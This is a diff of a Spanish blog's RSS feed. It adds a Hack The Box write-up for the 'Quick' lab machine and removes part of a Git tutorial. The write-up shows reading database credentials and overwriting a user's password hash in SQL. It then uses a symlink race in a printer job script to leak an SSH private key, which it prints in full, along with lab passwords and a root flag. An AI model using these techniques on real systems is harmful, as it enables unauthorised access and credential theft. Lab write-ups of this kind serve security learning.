+	# It is also possible to configure the loglevel for particular
+	# modules, e.g.
+	#LogLevel info ssl:warn
+
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+	# For most configuration files from conf-available/, which are
+	# enabled or disabled at a global level, it is possible to
+	# include a line for only one particular virtual host. For example the
+	# following line enables the CGI configuration for this host only
+	# after it has been globally disabled with &quot;a2disconf&quot;.
+	#Include conf-available/serve-cgi-bin.conf
+&amp;lt;/VirtualHost&amp;gt;
+&amp;lt;VirtualHost *:80&amp;gt;
+	AssignUserId srvadm srvadm
+	ServerName printerv2.quick.htb
+	DocumentRoot /var/www/printer
+&amp;lt;/VirtualHost&amp;gt;
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procemos a añadir el nuevo subdominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 printerv2.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Enumerando el sistema, encontramos un archivo con las credenciales de la base de datos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/html$ ls
+clients.php  db.php  home.php  index.php  login.php  search.php  ticket.php
+sam@quick:/var/www/html$ cat db.php 
+&amp;lt;?php
+$conn = new mysqli(&quot;localhost&quot;,&quot;db_adm&quot;,&quot;db_p4ss&quot;,&quot;quick&quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procemos a enumerar la base de datos y vemos las contraseñas hasheadas de los usuarios.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;sam@quick:/var/www/html$ mysql -udb_adm -pdb_p4ss -D quick
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 128
+Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&amp;gt; show tables;
++-----------------+
+| Tables_in_quick |
++-----------------+
+| jobs            |
+| tickets         |
+| users           |
++-----------------+
+3 rows in set (0.00 sec)
+
+mysql&amp;gt; describe users;
++----------+---------------+------+-----+---------+-------+
+| Field    | Type          | Null | Key | Default | Extra |
++----------+---------------+------+-----+---------+-------+
+| name     | varchar(100)  | YES  |     | NULL    |       |
+| email    | varchar(100)  | YES  |     | NULL    |       |
+| password | varchar(1000) | YES  |     | NULL    |       |
++----------+---------------+------+-----+---------+-------+
+3 rows in set (0.00 sec)
+
+mysql&amp;gt; select email, password from users;
++------------------+----------------------------------+
+| email            | password                         |
++------------------+----------------------------------+
+| elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
+| srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
++------------------+----------------------------------+
+2 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Probamos a tratar de crackear los hashes pero no nos resulta posible, pero debemos recordar que al ser el usuario &lt;code&gt;db_adm&lt;/code&gt;, podemos tener algunos privilegios entre ellos el de modificar las credenciales.&lt;/p&gt;
+
+&lt;p&gt;Para ello como ya contamos con la password de &lt;code&gt;elisa&lt;/code&gt;, vamos a modificar a tratar de modificar la password del usuario &lt;code&gt;srvadm&lt;/code&gt;, de tal modo que sea la misma.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&amp;gt; update users set password=&quot;c6c35ae1f3cb19438e0199cfa72a9d9d&quot; where email=&quot;srvadm@quick.htb&quot;;
+Query OK, 1 row affected (0.00 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+mysql&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos conectamos exitosamente con las nuevas credenciales &lt;code&gt;srvadm@quick.htb:Quick4cc3$$&lt;/code&gt; y ganamos acceso a una aplicación de impresoras.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Si seleccionamos la opción &lt;code&gt;add printer&lt;/code&gt;, vemos que se establece una conexión al puerto &lt;code&gt;9100&lt;/code&gt; y si ingresamos nuestra ip, recibimos una conexión al imprimir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::9100
+Ncat: Listening on 0.0.0.0:9100
+Ncat: Connection from 10.10.10.186.
+Ncat: Connection from 10.10.10.186:44216.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Al continuar enumerando el sistema, encontramos un archivo de nombre &lt;code&gt;job.php&lt;/code&gt;, el cual crea un archivo con nombre de la fecha actual y lo almance en la ruta &lt;code&gt;/var/www/jobs&lt;/code&gt; con el contenido que ingresamos en &lt;code&gt;bill details&lt;/code&gt; en jobs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tambien podemos observar que despues genera una conexión a una ip y puerto especifico, donde envia dicho contenido. Pero vemos algo muy interesante ya que en el proceso se ejecuta un &lt;code&gt;sleep(0.5)&lt;/code&gt; de medio segundo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
+require __DIR__ . '/escpos-php/vendor/autoload.php';
+use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
+use Mike42\Escpos\Printer;
+include(&quot;db.php&quot;);
+session_start();
+
+if($_SESSION[&quot;loggedin&quot;])
+{
+	if(isset($_POST[&quot;submit&quot;]))
+	{
+		$title=$_POST[&quot;title&quot;];
+		$file = date(&quot;Y-m-d_H:i:s&quot;);
+		file_put_contents(&quot;/var/www/jobs/&quot;.$file,$_POST[&quot;desc&quot;]);
+		chmod(&quot;/var/www/printer/jobs/&quot;.$file,&quot;0777&quot;);
+		$stmt=$conn-&amp;gt;prepare(&quot;select ip,port from jobs&quot;);
+		$stmt-&amp;gt;execute();
+		$result=$stmt-&amp;gt;get_result();
+		if($result-&amp;gt;num_rows &amp;gt; 0)
+		{
+			$row=$result-&amp;gt;fetch_assoc();
+			$ip=$row[&quot;ip&quot;];
+			$port=$row[&quot;port&quot;];
+			try
+			{
+				$connector = new NetworkPrintConnector($ip,$port);
+				sleep(0.5); //Buffer for socket check
+				$printer = new Printer($connector);
+				$printer -&amp;gt; text(file_get_contents(&quot;/var/www/jobs/&quot;.$file));
+				$printer -&amp;gt; cut();
+				$printer -&amp;gt; close();
+				$message=&quot;Job assigned&quot;;
+				unlink(&quot;/var/www/jobs/&quot;.$file);
+			}
+			catch(Exception $error) 
+			{
+				$error=&quot;Can't connect to printer.&quot;;
+				unlink(&quot;/var/www/jobs/&quot;.$file);
+			}
+		}
+		else
+		{
+			$error=&quot;Couldn't find printer.&quot;;
+		}
+	}
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos aprovecharnos de este &lt;code&gt;sleep&lt;/code&gt;, para poder crearnos un archivo con el nombre de la fecha actual, y cuando se ejecute el &lt;code&gt;sleep&lt;/code&gt; puedo secuestrar el contenido original para crear un link simbolico que apunte a la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Para ello ejecutare la siguente instrucción.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/printer$ while true; do fecha=$(date +%F_%H:%M:%S); if [ -r $fecha ]; then ln -s -f /home/srvadm/.ssh/id_rsa $fecha; break; fi; done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Me pondre en escucha por el puerto &lt;code&gt;9100&lt;/code&gt; y agregare un contenido en &lt;code&gt;bill details&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Recibimos con exito la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::9100
+Ncat: Listening on 0.0.0.0:9100
+Ncat: Connection from 10.10.10.186.
+Ncat: Connection from 10.10.10.186:44256.
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
+AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
+1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
+DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
+whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
+hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
+ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
+Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
+DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
+j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
+H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
+9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
+bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
+F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
+T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
+8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
+b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
+pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
+GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
+Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
+LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
+2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
+x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
++DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
+NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
+-----END RSA PRIVATE KEY-----
+VA#            
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora nos conectamos como el usario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ chmod 600 id_rsa
+❯ ssh -i id_rsa srvadm@10.10.10.186
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jun 17 01:32:15 UTC 2023
+
+  System load:  0.18              Users logged in:                0
+  Usage of /:   73.4% of 7.75GB   IP address for ens33:           10.10.10.186
+  Memory usage: 17%               IP address for docker0:         172.17.0.1
+  Swap usage:   0%                IP address for br-9ef1bb2e82cd: 172.18.0.1
+  Processes:    191
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+52 packages can be updated.
+27 updates are security updates.
+
+
+Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129
+srvadm@quick:~$ whoami
+srvadm
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dentro los dos directios del usuario &lt;code&gt;srvadm&lt;/code&gt;, encontramos un archivo de configuración y al leerlo encontramos unas credenciales.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ find .
+.
+./conf.d
+./conf.d/printers.conf
+./conf.d/cupsd.conf
+./logs
+./logs/debug.log
+./logs/error.log
+./logs/cups.log
+./packages
+./motd.legal-displayed
+srvadm@quick:~/.cache$ cat ./conf.d/printers.conf
+MakeModel KONICA MINOLTA C554SeriesPS(P)
+DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
+State Idle
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si ahora lo urldecodeamos para verlo mejor obtenemos unas nuevas credenciales que corresponden al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
+Interactive mode enabled
+
+php &amp;gt; echo urldecode(&quot;MakeModel KONICA MINOLTA C554SeriesPS(P)
+php &quot; DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
+php &quot; State Idle&quot;);
+MakeModel KONICA MINOLTA C554SeriesPS(P)
+DeviceURI https://srvadm@quick.htb:&amp;amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
+State Idle
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo unico que tenemos que hacer ahora es dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ su root
+Password: 
+root@quick:/home/srvadm/.cache# whoami
+root
+root@quick:/home/srvadm/.cache# cd /root/
+root@quick:~# cat root.txt 
+914fef2cca09448887142468da0f2136
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Maquina bastante guapa! 😃&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Quick</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Quick</guid>
+        
+        <category>http3</category>
+        
+        <category>Information leaked</category>
+        
+        <category>Bruteforce</category>
+        
+        <category>XSS Injection Esigate</category>
+        
+        <category>change password db</category>
+        
+        <category>Abusing Printer</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Blunder - htb writeup</title>
@@ -5254,1375 +6013,6 @@ C:\Users\Administrator\Desktop&amp;gt;
         
         
         <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Aprende a usar Git gratis desde cero y vuelvete un experto</title>
-        <description>&lt;p&gt;Hola en esta ocasión hablaremos de &lt;code&gt;Git&lt;/code&gt; donde explicaremos paso a paso como funciona y el alcance que tiene que hace que sea necesario aprenderlo cuanto antes, asi que preparate por que debes aprender a usarlo a la de ya!.&lt;/p&gt;
-
-&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;#que-es-git&quot;&gt;Que es Git?&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#control-de-versiones&quot;&gt;Control de Versiones&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#repositorio&quot;&gt;Repositorio&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#repositorio-local&quot;&gt;Repositorio Local&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#repositorio-remoto&quot;&gt;Repositorio Remoto&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#commit-comprometer&quot;&gt;Commit - Comprometer&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#instalación&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#configuración&quot;&gt;Configuración&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#creación-del-repositorio&quot;&gt;Creación del Repositorio&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#areas-de-git&quot;&gt;Areas de Git&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#directorio-de-trabajo-working-direcotry&quot;&gt;Directorio de Trabajo - Working Directory &lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#area-de-preparación-staging-area&quot;&gt;Area de Preparación - Staging Area&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#repositorio-.git&quot;&gt;Repositorio .git - Repository .git&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#estados-de-git&quot;&gt;Estados de Git&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#modificada-modified&quot;&gt;Modificada - Modified&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#preparada-staged&quot;&gt;Preparada - Staged&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#confirmada-commited&quot;&gt;Confirmada - Commited&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#estado-del-repositorio&quot;&gt;Estado del Repositorio&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#renombrar-archivos-del-repositorio&quot;&gt;Renombrar archivos del Repositorio&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#eliminar-archivos-del-repositorio&quot;&gt;Eliminar archivos del Repositorio&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#gitignore-ignorar-archivos-y-directorios&quot;&gt;Gitignore - Ignorar archivos y directorios&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#creación-de-un-commit&quot;&gt;Creación de un Commit&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#estructura-del-commit&quot;&gt;Estructura del Commit&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#historial-de-commits&quot;&gt;Historial de Commits&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#creación-alterna-de-commits&quot;&gt;Creación Alterna de Commits&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#cambiar-descripción-del-commit&quot;&gt;Cambiar Descripción del Commit&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#revertir-commits&quot;&gt;Revertir Commits&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#branch-ramas&quot;&gt;Branch - Ramas&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#creación-de-un-branch&quot;&gt;Creación de un Branch&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#moverse-de-branch&quot;&gt;Moverse de Branch&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#cambiar-nombre-al-branch&quot;&gt;Cambiar Nombre al Branch&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#eliminar-un-branch&quot;&gt;Eliminar un Branch&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#crear-commits-en-un-branch&quot;&gt;Crear Commits en un Branch&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#historial-de-commits-en-branchs&quot;&gt;Historial de Commits en Branchs&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#merge-fusionar-branchs&quot;&gt;Merge - Fusionar Branchs&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;Conflictos en Merge - Conflictos al fusionar branchs&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#conexión-con-github&quot;&gt;Conexión con Github&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;que-es-git&quot;&gt;Que es Git? &lt;a href=&quot;#que-es-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es un sistema de control de versiones que nos va a permitir rastrear todos lo cambios que hemos hecho en un conjunto de archivos.&lt;/p&gt;
-
-&lt;h2 id=&quot;control-de-versiones&quot;&gt;Control de Versiones &lt;a href=&quot;#control-de-versiones&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Viene a ser un sistema encargado de administrar los cambios que hemos realizado en un conjunto de  archivos o en programas de computadora.&lt;/p&gt;
-
-&lt;h2 id=&quot;repositorio&quot;&gt;Repositorio &lt;a href=&quot;#repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es un conjunto o colección de archivos de distintas versiones de un proyecto.&lt;/p&gt;
-
-&lt;p&gt;Existen 2 tipos de de reposototios:&lt;/p&gt;
-
-&lt;h3 id=&quot;repositorio-local&quot;&gt;Repositorio local &lt;a href=&quot;#repositorio-local&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Es local cuando esta almacenado unicamente en la pc que lo creamos donde solo nosotros tendremos acceso  a el.&lt;/p&gt;
-
-&lt;h3 id=&quot;repositorio-remoto&quot;&gt;Repositorio Remoto &lt;a href=&quot;#repositorio-remoto&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Cuando queremos dar acceso a otros desarrolladores o colaboradores a nuestro repositorio o para tener una copia segura guardada en un servidor externo, creamos servidores remotos.&lt;/p&gt;
-
-&lt;p&gt;Ambos tipos de repositorios trabajan juntos ya que podemos crear una copia local de un repositorio remoto en nuestra pc como local y podemos enviar tambien el repositorio local que creamos a un repositorio remoto.&lt;/p&gt;
-
-&lt;h2 id=&quot;commit-comprometer&quot;&gt;Commit - Comprometer &lt;a href=&quot;#commit-comprometer&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Son un registro del estado de un proyecto en un momento especifico, a lo largo de la vida del proyecto.&lt;/p&gt;
-
-&lt;p&gt;Supongamos que creamos un archivo, editamos el archivo, creamos una carpeta y borramosel archivo: cada una de estas acciones vendria a ser un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/commits.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;instalación&quot;&gt;Instalación &lt;a href=&quot;#instalación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para poder instalar &lt;code&gt;Git&lt;/code&gt; si estamos en &lt;code&gt;windows&lt;/code&gt; debemos ir a la pagina oficial para poder descargalo y al ejecutarlo solo debemos seguir los pasos por defecto:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://git-scm.com/downloads&quot;&gt;https://git-scm.com/downloads&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;En nuestro caso ya que trabajaremos en &lt;code&gt;linux&lt;/code&gt; por ser mas comodo unicamente neceistamos ejecutar el comando &lt;code&gt;apt install git&lt;/code&gt; y ya lo tendriamos instalado&lt;/p&gt;
-
-&lt;p&gt;En cuanto a lo demas todo es exactamente igual para cualquier sistema operativo en cuanto al desarrollo del curso despues de la instalación&lt;/p&gt;
-
-&lt;h2 id=&quot;configuración&quot;&gt;Configuración &lt;a href=&quot;#configuración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Una vez tengamos ya instalado &lt;code&gt;Git&lt;/code&gt; en nuestro sistema para comenzar a trabajar vamos a crear un directorio en un ruta de nuestro sistema.&lt;/p&gt;
-
-&lt;p&gt;En este caso creare el directorio &lt;code&gt;miGit&lt;/code&gt; usando el comando &lt;code&gt;mkdir&lt;/code&gt; y con &lt;code&gt;cd&lt;/code&gt; ingresare al directorio&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir miGit
-❯ cd miGit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora procederemos a configurar algo muy importante en &lt;code&gt;Git&lt;/code&gt; que seria nuestro usuario y correo, ya que cada vez que creeemos un &lt;code&gt;commit&lt;/code&gt; se registrara la información de quien realizo el cambio. Esto es util ya que si estamos trabajando en un proyecto colaborativo, cada uno de los desarrolladores del proyecto podran saber quien realizo ese cambio y cual es su correo asociado; de igual manera si solo nosotros estamos trabajando en el proyecto podemos saber en un futuro que cambio realizamos.&lt;/p&gt;
-
-&lt;p&gt;Para poder realizar la configuración del nombre de &lt;code&gt;usuario&lt;/code&gt; solo debemos ejecutar el siguiente comando.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config --global user.name &quot;Firtsmiracle&quot;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;cabe mencionar que si unicamente deseamos esta configuración para un unico proyecto debemos omitir el uso de la bandera &lt;code&gt;--global&lt;/code&gt;, pero al ser nosotros dueños del repositorio es recomendable hacerlo globalmente.&lt;/p&gt;
-
-&lt;p&gt;Si queremos ver que los cambios se realizaron correctamente usamos:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config user.name
-Firtsmiracle
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;De la misma manera si queremos configurar la información del &lt;code&gt;correo&lt;/code&gt;, usamos el comando:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config --global user.email &quot;firtsmiracle@hotmail.com&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;volvemos a revisar si los cambios se guardaron exitosamente con el comando:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config user.email
-firtsmiracle@hotmail.com
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;creación-del-repositorio&quot;&gt;Creación de Repositorio &lt;a href=&quot;#creación-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
